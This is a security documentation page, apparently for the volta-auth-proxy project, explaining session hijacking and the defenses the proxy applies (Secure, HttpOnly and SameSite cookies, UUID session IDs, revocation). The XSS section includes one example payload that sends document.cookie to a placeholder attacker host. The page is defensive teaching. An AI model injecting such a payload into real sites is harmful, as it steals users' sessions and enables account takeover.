# Session Hijacking

[日本語版はこちら](session-hijacking.ja.md)

---

## What is it?

Session hijacking is when an attacker steals or guesses your session identifier, letting them impersonate you without knowing your password. Imagine someone copies your hotel room keycard -- they can walk into your room and the door doesn't know the difference.

The attacker doesn't need to break encryption or guess passwords. They just need your session cookie value.

---

## Why does it matter?

A hijacked session gives the attacker full access to everything you can do -- read private data, change settings, invite users, even delete things. And since they're using a legitimate session, the server sees them as you. There are no failed login attempts to trigger alarms.

---

## How does it happen?

### 1. Network sniffing (HTTP without TLS)
If the site uses plain HTTP, anyone on the same Wi-Fi (coffee shop, airport) can see your cookies in transit. This is trivially easy with tools like Wireshark.

**Prevention:** Always use HTTPS. Set the `Secure` flag on cookies so they're never sent over HTTP.

### 2. Cross-Site Scripting (XSS)
If an attacker injects JavaScript into a page (`<script>fetch('https://evil.com?c='+document.cookie)</script>`), it can read and exfiltrate cookies.

**Prevention:** Set the `HttpOnly` flag on session cookies. This makes them invisible to JavaScript entirely.

### 3. Session fixation
The attacker sets your session ID to a value they know *before* you log in. After you log in, they already have the valid session ID.

**Prevention:** Generate a new session ID at login time. Never reuse pre-authentication session IDs.

---

## A simple example

```
Attacker on same Wi-Fi, site using HTTP:

[You]  -->  GET /dashboard  -->  [Server]
            Cookie: session=abc123
            (sent in plain text!)

[Attacker sniffs the network]
"I now have session=abc123"

[Attacker] -->  GET /dashboard  -->  [Server]
                Cookie: session=abc123
                Server: "Welcome back, user!"
```

With HTTPS + Secure flag, the cookie is encrypted in transit and never sent over HTTP.

---

## In volta-auth-proxy

volta applies multiple layers of defense:

| Defense | How volta implements it |
|---------|----------------------|
| **Secure flag** | Cookie includes `Secure` when the request is over HTTPS (`ctx.req().isSecure()`) |
| **HttpOnly flag** | Always set -- JavaScript cannot read the session cookie |
| **SameSite=Lax** | Cookie not sent on cross-origin POST requests, reducing CSRF risk |
| **UUID session IDs** | Session IDs are random UUIDs (122 bits of entropy), making them unguessable |
| **Server-side sessions** | Sessions live in Postgres, so they can be individually revoked |
| **IP + User-Agent tracking** | Each session records `ip_address` and `user_agent` for audit purposes |

The cookie is set in `setSessionCookie()`:

```java
String cookie = "volta_session=" + sessionId
    + "; Path=/; Max-Age=" + sessionTtlSeconds
    + "; HttpOnly; SameSite=Lax";
if (ctx.req().isSecure()) {
    cookie += "; Secure";
}
```

If a session is suspected of being hijacked, an admin can invalidate it by setting `invalidated_at`, immediately locking out the attacker.

---

## See also

- [session-storage-strategies.md](session-storage-strategies.md) -- Why server-side sessions enable revocation
- [sliding-window-expiry.md](sliding-window-expiry.md) -- How timeouts limit hijacking windows
